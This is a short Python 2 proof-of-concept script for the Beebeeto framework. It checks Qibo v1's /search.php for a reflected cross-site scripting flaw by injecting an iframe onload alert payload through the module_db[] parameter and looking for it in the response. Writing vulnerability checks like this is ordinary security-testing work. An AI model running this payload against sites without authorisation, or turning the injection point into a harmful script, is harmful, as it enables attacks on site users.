#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0219',
            'name': 'Qibo Information V1 /search.php 跨站脚本漏洞 POC',
            'author': 'user1018',
            'create_date': '2014-12-27',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Qibo',
            'vul_version': ['v1'],
            'type': 'Cross Site Scripting',
            'tag': ['Qibo漏洞', 'XSS漏洞', '/search.php', 'php'],
            'desc': '''
                    由于全局变量可控，通过控制变量可以进行反射型 XSS。
                    ''',
            'references': ['N/A'],
        },
    }


    @classmethod
    def verify(cls, args):
        payload = '/search.php?module_db[]=<iframe/onload=alert(bb2)><!--'
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if '<iframe/onload=alert(bb2)><!--' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())